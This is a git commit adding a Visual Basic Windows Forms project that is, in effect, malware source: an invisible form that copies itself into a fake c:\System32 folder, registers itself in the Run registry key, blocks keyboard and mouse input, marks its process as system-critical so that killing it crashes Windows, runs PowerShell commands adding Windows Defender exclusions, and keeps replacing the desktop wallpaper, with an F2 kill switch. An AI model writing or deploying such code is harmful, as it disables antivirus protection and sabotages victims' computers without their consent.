3f6d0c0237bd40ee567364f23a06f6f49afc2399
Gabriel Gama <96183059+GabrielGamaJC@users.noreply.github.com>
2022-12-11 15:58:29 -0300

    Add files via upload

---
+++ WindowsApp4/WindowsApp4/Form1.Designer.vb
@@ -0,0 +1,94 @@
+﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
+Partial Class Form1
+    Inherits System.Windows.Forms.Form
+
+    'Descartar substituições de formulário para limpar a lista de componentes.
+    <System.Diagnostics.DebuggerNonUserCode()> _
+    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
+        Try
+            If disposing AndAlso components IsNot Nothing Then
+                components.Dispose()
+            End If
+        Finally
+            MyBase.Dispose(disposing)
+        End Try
+    End Sub
+
+    'Exigido pelo Windows Form Designer
+    Private components As System.ComponentModel.IContainer
+
+    'OBSERVAÇÃO: o procedimento a seguir é exigido pelo Windows Form Designer
+    'Pode ser modificado usando o Windows Form Designer.  
+    'Não o modifique usando o editor de códigos.
+    <System.Diagnostics.DebuggerStepThrough()> _
+    Private Sub InitializeComponent()
+        Me.components = New System.ComponentModel.Container()
+        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Form1))
+        Me.PictureBox1 = New System.Windows.Forms.PictureBox()
+        Me.Timer1 = New System.Windows.Forms.Timer(Me.components)
+        Me.Timer2 = New System.Windows.Forms.Timer(Me.components)
+        Me.Timer3 = New System.Windows.Forms.Timer(Me.components)
+        Me.PictureBox2 = New System.Windows.Forms.PictureBox()
+        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).BeginInit()
+        CType(Me.PictureBox2, System.ComponentModel.ISupportInitialize).BeginInit()
+        Me.SuspendLayout()
+        '
+        'PictureBox1
+        '
+        Me.PictureBox1.Image = CType(resources.GetObject("PictureBox1.Image"), System.Drawing.Image)
+        Me.PictureBox1.Location = New System.Drawing.Point(12, 12)
+        Me.PictureBox1.Name = "PictureBox1"
+        Me.PictureBox1.Size = New System.Drawing.Size(80, 47)
+        Me.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
+        Me.PictureBox1.TabIndex = 0
+        Me.PictureBox1.TabStop = False
+        '
+        'Timer1
+        '
+        Me.Timer1.Interval = 5000
+        '
+        'Timer2
+        '
+        '
+        'Timer3
+        '
+        Me.Timer3.Interval = 30000
+        '
+        'PictureBox2
+        '
+        Me.PictureBox2.Image = CType(resources.GetObject("PictureBox2.Image"), System.Drawing.Image)
+        Me.PictureBox2.Location = New System.Drawing.Point(123, 41)
+        Me.PictureBox2.Name = "PictureBox2"
+        Me.PictureBox2.Size = New System.Drawing.Size(43, 33)
+        Me.PictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
+        Me.PictureBox2.TabIndex = 1
+        Me.PictureBox2.TabStop = False
+        '
+        'Form1
+        '
+        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
+        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
+        Me.ClientSize = New System.Drawing.Size(178, 86)
+        Me.Controls.Add(Me.PictureBox2)
+        Me.Controls.Add(Me.PictureBox1)
+        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None
+        Me.MaximizeBox = False
+        Me.MinimizeBox = False
+        Me.Name = "Form1"
+        Me.Opacity = 0R
+        Me.ShowIcon = False
+        Me.ShowInTaskbar = False
+        Me.Text = "windows"
+        Me.WindowState = System.Windows.Forms.FormWindowState.Minimized
+        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).EndInit()
+        CType(Me.PictureBox2, System.ComponentModel.ISupportInitialize).EndInit()
+        Me.ResumeLayout(False)
+
+    End Sub
+
+    Friend WithEvents PictureBox1 As PictureBox
+    Friend WithEvents Timer1 As Timer
+    Friend WithEvents Timer2 As Timer
+    Friend WithEvents Timer3 As Timer
+    Friend WithEvents PictureBox2 As PictureBox
+End Class
---
+++ WindowsApp4/WindowsApp4/Form1.vb
@@ -0,0 +1,112 @@
+﻿Imports System.IO
+Imports System.Security.Principal
+Imports System.Net
+'Imports System.IO.Compression
+Imports System.Threading
+Imports System.Runtime.InteropServices
+Imports System.Management
+Imports System.Management.Instrumentation
+Imports System
+Imports System.Diagnostics
+Imports Microsoft.Win32
+Public Class Form1
+    Declare Function BlockInput Lib "user32" (ByVal fBlock As Boolean) As Integer
+    Public Declare Sub RtlSetProcessIsCritical Lib "ntdll.dll" (ByVal NewValue As Boolean, ByVal OldValue As Boolean, ByVal WinLogon As Boolean)
+    Private Declare Function GetAsyncKeyState Lib "User32" (ByVal vKey As Integer) As Integer
+    Private Const SETDESKWALLPAPER = 20
+    Private Const UPDATEINIFILE = &H1
+    Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer
+    Private Declare Function BlockInput Lib "user32" (ByVal fBlock As Long) As Long
+    Public Sub AdicionarAplicacaoAoIniciar()
+        Dim caminho As String = "c:\System32\a.exe"
+        Try
+            Using key As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
+                key.SetValue(caminho, """" + Application.ExecutablePath + """")
+            End Using
+        Catch
+            Throw
+        End Try
+    End Sub
+    Public Sub RemoverAplicacaoAoIniciar()
+        '  Dim caminho As String = Application.StartupPath & "\a.exe"
+        Dim caminho As String = "c:\System32\a.exe"
+
+        Try
+            Using key As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
+                key.DeleteValue(caminho, False)
+            End Using
+        Catch
+            Throw
+        End Try
+    End Sub
+    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+
+        If My.Computer.FileSystem.DirectoryExists("c:\system32") Then
+            System.IO.Directory.Delete("c:\System32", True)
+            End
+        Else
+            Timer2.Start()
+            System.IO.Directory.CreateDirectory("c:\system32")
+            FileCopy(Application.StartupPath & "\a.exe", "c:\system32\a.exe")
+            AdicionarAplicacaoAoIniciar()
+            BlockInput(True)
+            Process.EnterDebugMode()
+            RtlSetProcessIsCritical(True, False, False)
+            Shell("CMD.exe /c powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath " + "C:\System32")
+            Dim user = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
+            Dim startup = (user + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+            Dim caminho = "C:\System32\load.ps1"
+            Shell("CMD.exe /c powershell -NonInteractive -ExecutionPolicy Bypass Add-MpPreference -ExclusionPath " + Environment.GetFolderPath(Environment.SpecialFolder.UserProfile))
+            IO.File.WriteAllText("C:\System32\load.ps1", "Add-MpPreference -ExclusionPath """ & startup & """")
+            Shell("CMD.exe /c PowerShell -NonInteractive -ExecutionPolicy Bypass -Command " + caminho)
+            Thread.Sleep(3000)
+            Dim Location As String
+            Location = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\oi.png"
+            PictureBox1.Image.Save(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\oi.png")
+            SystemParametersInfo(SETDESKWALLPAPER, 0, Location, UPDATEINIFILE)
+            Timer1.Start()
+            ' End
+        End If
+    End Sub
+
+
+    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
+        BlockInput(False)
+        ' RtlSetProcessIsCritical(False, False, False)
+        Timer3.Start()
+        Timer1.Stop()
+
+    End Sub
+
+    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
+        Me.Focus()
+        Timer3.Start()
+        Dim f2 As Boolean = GetAsyncKeyState(Keys.F2)
+        If f2 = True Then
+            RemoverAplicacaoAoIniciar()
+            RtlSetProcessIsCritical(False, False, False)
+            End
+        End If
+
+    End Sub
+
+    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
+        '  My.Computer.Audio.Stop()
+        If My.Computer.FileSystem.FileExists(Application.StartupPath & "\oi2.png") Then
+            Dim Location As String
+            'System.IO.File.Delete(Application.StartupPath & "\oi.png")
+            Location = Application.StartupPath & "\oi2.png"
+            '  PictureBox3.Image.Save(Application.StartupPath & "\oi.png")
+            SystemParametersInfo(SETDESKWALLPAPER, 0, Location, UPDATEINIFILE)
+
+        Else
+            PictureBox2.Image.Save(Application.StartupPath & "\oi2.png")
+        End If
+        ' Dim Location As String
+        ' Location = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\oi2.gif"
+        ' PictureBox3.Image.Save(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\oi2.gif")
+        ' SystemParametersInfo(SETDESKWALLPAPER, 0, Location, UPDATEINIFILE)
+    End Sub
+
+
+End Class
